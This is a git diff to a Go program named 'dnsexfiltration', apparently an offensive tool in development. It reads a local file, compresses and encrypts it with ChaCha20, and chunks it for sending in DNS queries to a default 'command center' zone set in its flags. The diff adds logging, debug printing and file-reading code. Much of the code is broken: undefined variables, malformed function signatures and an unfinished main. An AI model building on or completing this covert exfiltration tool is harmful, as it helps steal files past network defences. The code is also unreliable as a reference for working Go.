@@ -48,6 +48,7 @@ var	3. Fixed overheads will be sufficiently amortised by messages as small as 8K
 package dnsexfiltration
 
 import (
+	"bufio"
 	"bytes"
 	"compress/zlib"
 	"crypto/rand"
@@ -60,12 +61,79 @@ import (
 	"net"
 	"os"
 
+	log "github.com/sirupsen/logrus"
+
+	"github.com/fatih/color"
 	"github.com/miekg/dns"
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
 // bytes per read operation
 var FILEREADSPEED int = 36
+
+// use this to start the logger, cant keep it in globals.go
+// returns 0 if failure to open logfile, returns 1 otherwise
+// uses code from :
+// https://esc.sh/blog/golang-logging-using-logrus/
+func StartLogger(logfile string) (return_code int) {
+	Logs, derp := os.OpenFile(logfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
+	LoggerInstance := log.New()
+	Formatter := new(log.TextFormatter)
+	Formatter.ForceColors = true
+	Formatter.FullTimestamp = true
+	Formatter.TimestampFormat = "02-01-2006 15:04:05"
+	LoggerInstance.SetFormatter(Formatter)
+	if derp != nil {
+		// Cannot open log file. Logging to stderr
+		ErrorPrinter(derp, "[-] ERROR: Failure To Open Logfile!")
+		return 0
+	} else {
+		log.SetOutput(Logs)
+	}
+	return 1
+}
+
+// use this instead of the regular logging functions
+// ONLY use for errors!
+// returns the errors but adds them to a log while printing a
+// message to the screen for your viewing pleasure
+func ErrorPrinter(derp error, message string) error {
+	// output is being redirected to a file so we have to print as well
+	log.Error(message)
+	color.Red(message)
+	return derp
+}
+
+// shows entries from the logfile, starting at the bottom
+// limit by line number, loglevel, or time
+func ShowLogs(LinesToPrint int, loglevel string, time string) {
+	// set log thingie to use json so our json file
+	// can be used
+	log.SetFormatter(&log.JSONFormatter{})
+	//switch loglevel{
+	//	case "error":
+	//		log.ErrorLevel
+
+}
+
+// debugging feedback function
+// prints colored text for easy visual identification of data
+// color_int (1,red)(2,green)(3,blue)(4,yellow)
+func Debug_print(color_int int8, message string) {
+	//if color_int
+	switch color_int {
+	//is 1
+	case 1:
+		color.Red(message)
+		// and so on
+	case 2:
+		color.Blue(message)
+	case 3:
+		color.Green(message)
+	case 4:
+		color.Yellow(message)
+	}
+}
 
 // function to use zlib to compress a byte array
 func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
@@ -81,18 +149,40 @@ func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
 	//copy(herp, b.Bytes())
 	return herp, derp
 }
-func ZDecompress(DataIn []byte) {
+func ZDecompress(DataIn []byte) (DataOut []byte) {
 	var buff []byte
 	b := bytes.NewReader(buff)
 	r, derp := zlib.NewReader(b)
 	if derp != nil {
 		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
-	io.Copy(os.Stdout, r)
+	Copy(DataOut, r)
 	r.Close()
+	return DataOut
 }
-func OpenFile() {
 
+func OpenFile(filename) (fileobject []io.ByteReader) {
+	// open the file
+	herp, derp := os.Open(*filepath)
+	if derp != nil {
+		ErrorHandling.ErrorPrinter(derp, "[-] Could not open File")
+	}
+	defer func() {
+		if derp = herp.Close(); derp != nil {
+			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+		}
+	}()
+	reader := bufio.NewReader(f)
+	buffer := make([]byte, FILEREADSPEED)
+	for {
+		herp, derp := r.Read(b)
+		if derp != nil {
+			ErrorHandling.ErrorPrinter(derp, "[-] Could not read from file")
+			break
+		}
+	}
+
+	return fileobject
 }
 
 // This function creates a nonce with the bit size set
@@ -142,7 +232,7 @@ func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp erro
 // with a variable sized nonce
 func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Salsa []byte, derp error) {
 	var key [32]byte
-	out := make([]byte, len(bytes_in))
+	DataOut := make([]byte, len(bytes_in))
 	if derp != nil {
 		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
@@ -152,17 +242,8 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 	pass := "Hello"
 	msg := "Pass"
 
-	argCount := len(os.Args[1:])
-
-	if argCount > 0 {
-		msg = string(os.Args[1])
-	}
-	if argCount > 1 {
-		pass = string(os.Args[2])
-	}
-
 	key := sha256.Sum256([]byte(pass))
-	aead, _ := chacha20poly1305.NewX(key[:])
+	herp, derp := chacha20poly1305.NewX(key[:])
 
 	if pass == "" {
 		a := make([]byte, 32)
@@ -177,11 +258,11 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 
 	nonce := make([]byte, chacha20poly1305.NonceSizeX)
 
-	ciphertext := aead.Seal(nil, nonce, []byte(msg), nil)
+	HaChaChaCha := aead.Seal(nil, nonce, []byte(msg), nil)
 
 	plaintext, _ := aead.Open(nil, nonce, ciphertext, nil)
 
-	copy(Salsa, out)
+	copy(DataOut, HaChaChaCha)
 	for _, element := range out {
 		// original code treated this like a nullbyte but wat?
 		if element == 0 {
@@ -189,7 +270,7 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 			//return
 		}
 	}
-	return Salsa, derp
+	return DataOut, derp
 }
 func sendDNSmessage(MsgAsHexStr string, DestZone string) {
 	var debug bool = true
@@ -210,15 +291,11 @@ func DnsReceiver() {
 	dns.Server.Listener()
 }
 
+// main function
 // Exports a sequence of bytes via DNS packets
-// max message size should be below 63 but 5 ... I guess?
-// 63 is total available per packet I think
+// max message size is 512 bytes
 func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (herp, derp error) {
 	//var debug bool = true
-	//the local file to exfiltrate.
-	//var file []byte = ByteArrayInput
-	// the dns zone to send the queries to.
-	DestZone = ""
 	MaxMsgSize = 512 // bytes
 	//chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)
 
@@ -229,9 +306,11 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (he
 
 }
 
+// only used for parsing arguments
 func main() {
 	var debug = flag.Bool("d", false, "enable debugging.")
 	var file = flag.String("file", "", "the local file to exfiltrate.")
+	var logfile = flag.String("logfile", "", "logfile")
 	var help = flag.Bool("help", false, "show help.")
 	var DerpKey = flag.String("key", "Herp-Key-Derp")
 	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")
@@ -242,5 +321,6 @@ func main() {
 		flag.PrintDefaults()
 		return
 	}
-	if
+	fileobject := OpenFile(file)
+
 }
